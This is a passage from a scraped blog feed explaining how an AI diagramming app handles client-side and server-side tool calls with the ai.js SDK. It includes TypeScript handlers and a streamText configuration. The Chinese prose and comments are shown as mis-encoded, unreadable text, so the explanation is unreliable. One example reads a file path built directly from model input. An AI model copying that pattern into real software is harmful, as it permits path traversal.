Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">errorText</span>: <span class="hljs-string">`Some operations failed:\n<span class="hljs-subst">${errorMessages}</span>
Current diagram XML:
\`\`\`xml
<span class="hljs-subst">${currentXml}</span>
\`\`\`
Please check the cell IDs and retry.`</span>,
Â  Â  Â  Â  Â  Â  })
Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// æ¸…é™¤ç¼“å­˜</span>
Â  Â  Â  Â  Â  Â  editDiagramOriginalXmlRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">delete</span>(toolCall.<span class="hljs-property">toolCallId</span>)
Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">return</span>
Â  Â  Â  Â  }


Â  Â  Â  Â  <span class="hljs-comment">// æ¸²æŸ“æ ¡éªŒ</span>
Â  Â  Â  Â  <span class="hljs-keyword">const</span> validationError = <span class="hljs-title function_">onDisplayChart</span>(editedXml)
Â  Â  Â  Â  <span class="hljs-keyword">if</span> (validationError) {
Â  Â  Â  Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"edit_diagram"</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">state</span>: <span class="hljs-string">"output-error"</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">errorText</span>: <span class="hljs-string">`Edit produced invalid XML: <span class="hljs-subst">${validationError}</span>
Current diagram XML:
\`\`\`xml
<span class="hljs-subst">${currentXml}</span>
\`\`\`
Please fix the operations to avoid structural issues.`</span>,
Â  Â  Â  Â  Â  Â  })
Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// æ¸…é™¤ç¼“å­˜</span>
Â  Â  Â  Â  Â  Â  editDiagramOriginalXmlRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">delete</span>(toolCall.<span class="hljs-property">toolCallId</span>)
Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">return</span>
Â  Â  Â  Â  }
Â  Â  Â  Â  <span class="hljs-comment">// æˆåŠŸ</span>
Â  Â  Â  Â  <span class="hljs-title function_">onExport</span>()
Â  Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"edit_diagram"</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">output</span>: <span class="hljs-string">`Successfully applied <span class="hljs-subst">${operations.length}</span> operation(s) to the diagram.`</span>,
Â  Â  Â  Â  })
Â  Â  Â  Â  <span class="hljs-comment">// æ¸…é™¤ç¼“å­˜</span>
Â  Â  Â  Â  editDiagramOriginalXmlRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">delete</span>(toolCall.<span class="hljs-property">toolCallId</span>)

Â  Â  } <span class="hljs-keyword">catch</span> (error) {
		<span class="hljs-comment">// jsæ‰§è¡Œçš„æœªçŸ¥é”™è¯¯</span>
Â  Â  Â  Â  <span class="hljs-keyword">const</span> errorMessage =
Â  Â  Â  Â  Â  Â  error <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Error</span> ? error.<span class="hljs-property">message</span> : <span class="hljs-title class_">String</span>(error)
Â  Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"edit_diagram"</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">state</span>: <span class="hljs-string">"output-error"</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">errorText</span>: <span class="hljs-string">`Edit failed: <span class="hljs-subst">${errorMessage}</span>
Current diagram XML:
\`\`\`xml
<span class="hljs-subst">${currentXml || <span class="hljs-string">"No XML available"</span>}</span>
\`\`\`
Please check cell IDs and retry, or use display_diagram to regenerate.`</span>,
Â  Â  Â  Â  })
Â  Â  Â  Â  <span class="hljs-comment">// æ¸…é™¤ç¼“å­˜</span>
Â  Â  Â  Â  editDiagramOriginalXmlRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">delete</span>(toolCall.<span class="hljs-property">toolCallId</span>)

Â  Â  }

}

</code></pre>
<h5 data-id="heading-18">c.<code>append_diagram</code></h5>
<p>æµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-css" lang="css">
flowchart <span class="hljs-selector-tag">TD</span>
    <span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[<span class="hljs-string">"æå–ç»­ä¼ çš„XMLç‰‡æ®µ"</span>]</span> --&gt; <span class="hljs-selector-tag">B</span>{"æ ¡éªŒæ˜¯å¦åˆè§„ï¼ˆå³æ»¡è¶³æç¤ºè¯ä¸­çš„è§„èŒƒï¼‰"}
    <span class="hljs-selector-tag">B</span> --&gt;|æ˜¯| D<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›è¿è§„,é‡æ–°ç»­ä¼ çš„æç¤º+ç»ˆæ­¢å‡½æ•°"</span>]</span>
    <span class="hljs-selector-tag">B</span> --&gt;|å¦| E<span class="hljs-selector-attr">[<span class="hljs-string">"æ‹¼æ¥XMLï¼špartialXmlRef += æœ¬æ¬¡XML"</span>]</span>
    E --&gt; F<span class="hljs-selector-attr">[<span class="hljs-string">"éªŒè¯æ‹¼æ¥åXMLæ˜¯å¦å®Œæ•´"</span>]</span>
    F --&gt; G{æ˜¯å¦å®Œæ•´ï¼Ÿ&lt;br/&gt;isComplete=true?}
    G --&gt;|æ˜¯| H<span class="hljs-selector-attr">[<span class="hljs-string">"é‡ç½®ç¼“å­˜â†’åŒ…è£…XMLâ†’éªŒè¯åˆæ³•æ€§"</span>]</span>
    H --&gt; <span class="hljs-selector-tag">I</span>{XMLæ˜¯å¦åˆæ³•ï¼Ÿ&lt;br/&gt;validationErrorå­˜åœ¨ï¼Ÿ}
    <span class="hljs-selector-tag">I</span> --&gt;|æ˜¯| J<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›éªŒè¯å¤±è´¥æç¤º"</span>]</span>
    <span class="hljs-selector-tag">I</span> --&gt;|å¦| K<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›æ‹¼æ¥æˆåŠŸæç¤º"</span>]</span>
    G --&gt;|å¦| L<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›ä»éœ€ç»­ä¼ æç¤º"</span>]</span>

</code></pre>
<p>ä¸»è¦ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript">
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleAppendDiagram</span> = (<span class="hljs-params">
Â  Â  toolCall: ToolCall,
Â  Â  addToolOutput: AddToolOutputFn,
</span>) =&gt; {
Â  Â  <span class="hljs-keyword">const</span> { xml } = toolCall.<span class="hljs-property">input</span> <span class="hljs-keyword">as</span> { <span class="hljs-attr">xml</span>: <span class="hljs-built_in">string</span> }
Â  Â  <span class="hljs-keyword">const</span> trimmed = xml.<span class="hljs-title function_">trim</span>()
Â  Â  <span class="hljs-comment">// æ£€éªŒæ˜¯å¦æ»¡è¶³æç¤ºè¯è§„èŒƒ</span>
Â  Â  <span class="hljs-keyword">const</span> isFreshStart =
Â  Â  Â  Â  trimmed.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"&lt;mxGraphModel"</span>) ||
Â  Â  Â  Â  trimmed.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"&lt;root"</span>) ||
Â  Â  Â  Â  trimmed.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"&lt;mxfile"</span>) ||
Â  Â  Â  Â  trimmed.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'&lt;mxCell id="0"'</span>) ||
Â  Â  Â  Â  trimmed.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'&lt;mxCell id="1"'</span>)
Â  Â  <span class="hljs-keyword">if</span> (isFreshStart) {
Â  Â      <span class="hljs-comment">// ä¸æ»¡è¶³</span>
Â  Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"append_diagram"</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">state</span>: <span class="hljs-string">"output-error"</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">errorText</span>: <span class="hljs-string">`ERROR: You started fresh with wrapper tags. Do NOT include wrapper tags or root cells (id="0", id="1").
Continue from EXACTLY where the partial ended:
\`\`\`
<span class="hljs-subst">${partialXmlRef.current.slice(-<span class="hljs-number">500</span>)}</span>
\`\`\`
Start your continuation with the NEXT character after where it stopped.`</span>,
Â  Â  Â  Â  })
Â  Â  Â  Â  <span class="hljs-keyword">return</span>
Â  Â  }


Â  Â  <span class="hljs-comment">// æ‹¼æ¥</span>
Â  Â  partialXmlRef.<span class="hljs-property">current</span> += xml
Â  Â  <span class="hljs-comment">// å®Œæ•´æ€§æ£€éªŒ</span>
Â  Â  <span class="hljs-keyword">const</span> isComplete = <span class="hljs-title function_">isMxCellXmlComplete</span>(partialXmlRef.<span class="hljs-property">current</span>)
Â  Â 
Â  Â  <span class="hljs-keyword">if</span> (isComplete) {
Â  Â  Â  Â  <span class="hljs-keyword">const</span> finalXml = partialXmlRef.<span class="hljs-property">current</span>
Â  Â  Â  Â  partialXmlRef.<span class="hljs-property">current</span> = <span class="hljs-string">""</span>
Â  Â  Â  Â  <span class="hljs-keyword">const</span> fullXml = <span class="hljs-title function_">wrapWithMxFile</span>(finalXml)
Â  Â  Â  Â  
Â  Â  Â  Â  <span class="hljs-comment">// æ¸²æŸ“æ ¡éªŒ</span>
Â  Â  Â  Â  <span class="hljs-keyword">const</span> validationError = <span class="hljs-title function_">onDisplayChart</span>(fullXml)
Â  Â  Â  Â  <span class="hljs-keyword">if</span> (validationError) {
Â  Â  Â  Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"append_diagram"</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">state</span>: <span class="hljs-string">"output-error"</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">errorText</span>: <span class="hljs-string">`Validation error after assembly: <span class="hljs-subst">${validationError}</span>
Assembled XML:
\`\`\`xml
<span class="hljs-subst">${finalXml.substring(<span class="hljs-number">0</span>, <span class="hljs-number">2000</span>)}</span>...
\`\`\`
Please use display_diagram with corrected XML.`</span>,
Â  Â  Â  Â  Â  Â  })
Â  Â  Â  Â  } <span class="hljs-keyword">else</span> {
Â  Â  Â  Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"append_diagram"</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">output</span>: <span class="hljs-string">"Diagram assembly complete and displayed successfully."</span>,
Â  Â  Â  Â  Â  Â  })
Â  Â  Â  Â  }
Â  Â  } <span class="hljs-keyword">else</span> {
Â  Â  Â  Â  <span class="hljs-comment">// ä»ç„¶ä¸å®Œæ•´ï¼Œæç¤ºç»§ç»­è¡¥å……</span>
Â  Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"append_diagram"</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">state</span>: <span class="hljs-string">"output-error"</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">errorText</span>: <span class="hljs-string">`XML still incomplete (mxCell not closed). Call append_diagram again to continue.
Current ending:
\`\`\`
<span class="hljs-subst">${partialXmlRef.current.slice(-<span class="hljs-number">500</span>)}</span>
\`\`\`
Continue from EXACTLY where you stopped.`</span>,
Â  Â  Â  Â  })
Â  Â  }
}

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é€šè¿‡`ai.js`ä¸`@ai-sdk`å®ç°å‰åç«¯toolæ³¨å…¥ä¸äº¤äº’]]></title>    <link>https://juejin.cn/post/7592159803411562532</link>    <guid>https://juejin.cn/post/7592159803411562532</guid>    <pubDate>2026-01-07T18:22:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592159803411562532" data-draft-id="7592452108797640747" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é€šè¿‡`ai.js`ä¸`@ai-sdk`å®ç°å‰åç«¯toolæ³¨å…¥ä¸äº¤äº’"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,LLM"/> <meta itemprop="datePublished" content="2026-01-07T18:22:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="irises"/> <meta itemprop="url" content="https://juejin.cn/user/3030697436261735"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é€šè¿‡`ai.js`ä¸`@ai-sdk`å®ç°å‰åç«¯toolæ³¨å…¥ä¸äº¤äº’
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3030697436261735/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    irises
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T18:22:16.000Z" title="Wed Jan 07 2026 18:22:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ç¤ºä¾‹ä»£ç æ‘˜å–è‡ªå¼€æºé¡¹ç›®ï¼šnext-ai-draw-io</p>
</blockquote>
<h3 data-id="heading-0">1. æ€»è¿°</h3>
<p>åœ¨ <code>ai.js</code> ä¸­ï¼Œå·¥å…·ï¼ˆToolsï¼‰é€šè¿‡ <code>streamText</code> é…ç½®çš„ <code>tools</code> å‚æ•°æ³¨å…¥ï¼Œåˆ†ä¸ºä¸¤ç±»ï¼š</p>
<ul>
<li><strong>æœåŠ¡ç«¯å·¥å…·</strong>ï¼šé…ç½®åŒ…å« <code>execute</code> å¼‚æ­¥å‡½æ•°ï¼Œå¯åœ¨æœåŠ¡ç«¯è‡ªåŠ¨æ‰§è¡Œå¹¶è¿”å›ç»“æœï¼›</li>
<li><strong>å®¢æˆ·ç«¯å·¥å…·</strong>ï¼šä»…é…ç½®å…ƒä¿¡æ¯ï¼ˆ<code>description</code>/<code>inputSchema</code>ï¼‰ï¼Œæ—  <code>execute</code> å‡½æ•°ï¼Œéœ€å‰ç«¯æ‰§è¡Œåæ‰‹åŠ¨å›ä¼ ç»“æœã€‚</li>
</ul>
<h3 data-id="heading-1">2. å·¥å…·æ³¨å…¥ï¼ˆstreamText æ ¸å¿ƒé…ç½®ï¼‰</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æœåŠ¡ç«¯ streamText è°ƒç”¨ï¼ˆæ ¸å¿ƒä»£ç ï¼‰</span>
<span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">streamText</span>({
  <span class="hljs-attr">model</span>: <span class="hljs-title function_">openai</span>(<span class="hljs-string">'gpt-4o'</span>),
  <span class="hljs-attr">messages</span>: allMessages, <span class="hljs-comment">// å¯¹è¯å†å²</span>
  <span class="hljs-comment">// æ³¨å…¥å·¥å…·</span>
  <span class="hljs-attr">tools</span>: {
    <span class="hljs-comment">// 1. æœåŠ¡ç«¯å·¥å…·ï¼šå¸¦ execute å‡½æ•°</span>
    <span class="hljs-attr">get_shape_library</span>: {
      <span class="hljs-attr">description</span>: <span class="hljs-string">"è·å–draw.ioå½¢çŠ¶åº“æ–‡æ¡£"</span>, <span class="hljs-comment">// æ¨¡å‹è¯†åˆ«å·¥å…·çš„æè¿°</span>
      <span class="hljs-attr">inputSchema</span>: z.<span class="hljs-title function_">object</span>({ <span class="hljs-comment">// å…¥å‚æ ¡éªŒSchemaï¼ˆzodï¼‰</span>
        <span class="hljs-attr">library</span>: z.<span class="hljs-title function_">string</span>().<span class="hljs-title function_">describe</span>(<span class="hljs-string">"å½¢çŠ¶åº“åç§°ï¼Œå¦‚aws4"</span>)
      }),
      <span class="hljs-comment">// æœåŠ¡ç«¯è‡ªåŠ¨æ‰§è¡Œçš„å‡½æ•°ï¼Œè¿”å›å€¼ç›´æ¥ä¼ ç»™æ¨¡å‹</span>
      <span class="hljs-attr">execute</span>: <span class="hljs-keyword">async</span> ({ library }) =&gt; {
        <span class="hljs-comment">// æœåŠ¡ç«¯ä¸šåŠ¡é€»è¾‘ï¼ˆæ–‡ä»¶è¯»å–/APIè°ƒç”¨ç­‰ï¼‰</span>
        <span class="hljs-keyword">const</span> content = <span class="hljs-keyword">await</span> fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">`./docs/<span class="hljs-subst">${library}</span>.md`</span>, <span class="hljs-string">'utf-8'</span>);
        <span class="hljs-keyword">return</span> content; <span class="hljs-comment">// ç»“æœè‡ªåŠ¨è¿”å›ç»™æ¨¡å‹ï¼Œæ— éœ€æ‰‹åŠ¨å¤„ç†</span>
      }
    },
    <span class="hljs-comment">// 2. å®¢æˆ·ç«¯å·¥å…·ï¼šä»…å…ƒä¿¡æ¯ï¼Œæ—  execute</span>
    <span class="hljs-attr">display_diagram</span>: {
      <span class="hljs-attr">description</span>: <span class="hljs-string">"åœ¨draw.ioæ¸²æŸ“å›¾å½¢ï¼ˆå®¢æˆ·ç«¯æ‰§è¡Œï¼‰"</span>,
      <span class="hljs-attr">inputSchema</span>: z.<span class="hljs-title function_">object</span>({
        <span class="hljs-attr">xml</span>: z.<span class="hljs-title function_">string</span>().<span class="hljs-title function_">describe</span>(<span class="hljs-string">"draw.ioçš„mxCell XMLå­—ç¬¦ä¸²"</span>)
      })
      <span class="hljs-comment">// æ—  execute å‡½æ•°ï¼Œéœ€å‰ç«¯å¤„ç†</span>
    }
  },
  <span class="hljs-attr">experimental_repairToolCall</span>: <span class="hljs-keyword">async</span> ({ toolCall, error }) =&gt; {
    <span class="hljs-comment">// ä¿®å¤æ¨¡å‹è¿”å›çš„å·¥å…·å…¥å‚æ ¼å¼é”™è¯¯ï¼ˆå¦‚æˆªæ–­çš„JSONï¼‰</span>
    <span class="hljs-keyword">if</span> (error.<span class="hljs-property">name</span> === <span class="hljs-string">'InvalidToolInputError'</span>) {
      <span class="hljs-keyword">return</span> { ...toolCall, <span class="hljs-attr">input</span>: <span class="hljs-title function_">jsonrepair</span>(toolCall.<span class="hljs-property">input</span>) };
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
  },
  <span class="hljs-attr">onFinish</span>: <span class="hljs-function">(<span class="hljs-params">{ totalUsage }</span>) =&gt;</span> {
    <span class="hljs-comment">// å¯¹è¯ç»“æŸå›è°ƒï¼ˆè®°å½•token/æ—¥å¿—ï¼‰</span>
  }
});

<span class="hljs-comment">// è½¬æ¢ä¸ºå‰ç«¯å¯è¯†åˆ«çš„æµå¼å“åº”</span>
<span class="hljs-keyword">return</span> result.<span class="hljs-title function_">toUIMessageStreamResponse</span>({
  <span class="hljs-attr">sendReasoning</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// è¿”å›æ¨¡å‹æ¨ç†è¿‡ç¨‹</span>
});
</code></pre>
<p><strong>æ³¨è§£</strong>ï¼š</p>
<ul>
<li><code>tools</code> å¯¹è±¡ä¸­ï¼Œæ¯ä¸ªé”®ä¸ºå·¥å…·åç§°ï¼Œå€¼ä¸ºå·¥å…·é…ç½®ï¼›</li>
<li><code>inputSchema</code>ï¼ˆzod æ ¼å¼ï¼‰ç”¨äºæ ¡éªŒæ¨¡å‹ä¼ å…¥çš„å·¥å…·å‚æ•°ï¼›</li>
<li><code>toUIMessageStreamResponse</code> æ˜¯æœåŠ¡ç«¯ä¸å‰ç«¯ <code>useChat</code> é€šä¿¡çš„å…³é”®ï¼Œæ ¼å¼åŒ–æµå¼å“åº”ä¸ºå‰ç«¯å¯è§£æçš„ç»“æ„ï¼ˆåŒ…å« <code>toolCall</code>/<code>text</code> ç­‰å­—æ®µï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-2">3. å‰ç«¯å·¥å…·äº¤äº’ï¼ˆuseChat æ ¸å¿ƒé…ç½®ï¼‰</h3>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// å‰ç«¯ useChat è°ƒç”¨</span>
<span class="hljs-keyword">const</span> { messages, sendMessage, addToolOutput } = <span class="hljs-title function_">useChat</span>({
  <span class="hljs-comment">// é…ç½®ä¼ è¾“å±‚ï¼Œå¯¹æ¥æœåŠ¡ç«¯ /api/chat æ¥å£</span>
  <span class="hljs-attr">transport</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultChatTransport</span>({
    <span class="hljs-attr">api</span>: <span class="hljs-string">'/api/chat'</span>,
  }),
  <span class="hljs-comment">// æ¨¡å‹è§¦å‘å·¥å…·è°ƒç”¨æ—¶çš„å›è°ƒ</span>
  <span class="hljs-attr">onToolCall</span>: <span class="hljs-keyword">async</span> ({ toolCall }) =&gt; {
    <span class="hljs-keyword">const</span> { <span class="hljs-attr">id</span>: toolCallId, toolName, <span class="hljs-attr">input</span>: toolInput } = toolCall;
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// åŒºåˆ†å·¥å…·ç±»å‹å¤„ç†</span>
      <span class="hljs-keyword">switch</span> (toolName) {
        <span class="hljs-comment">// å®¢æˆ·ç«¯å·¥å…·ï¼šå‰ç«¯æ‰§è¡Œé€»è¾‘ + æ‰‹åŠ¨å›ä¼ ç»“æœ</span>
        <span class="hljs-keyword">case</span> <span class="hljs-string">'display_diagram'</span>: {
          <span class="hljs-keyword">const</span> { xml } = toolInput <span class="hljs-keyword">as</span> { <span class="hljs-attr">xml</span>: <span class="hljs-built_in">string</span> };
          <span class="hljs-comment">// å‰ç«¯ä¸šåŠ¡é€»è¾‘ï¼ˆå¦‚è°ƒç”¨draw.io APIæ¸²æŸ“å›¾å½¢ï¼‰</span>
          <span class="hljs-keyword">await</span> <span class="hljs-title function_">renderDiagram</span>(xml);
          
          <span class="hljs-comment">// æ‰‹åŠ¨å›ä¼ ç»“æœç»™æ¨¡å‹</span>
          <span class="hljs-title function_">addToolOutput</span>({
            <span class="hljs-attr">toolCallId</span>: toolCallId, <span class="hljs-comment">// å¿…é¡»åŒ¹é…æ¨¡å‹è¿”å›çš„IDï¼ˆå…³é”®ï¼‰</span>
            <span class="hljs-attr">toolName</span>: toolName,
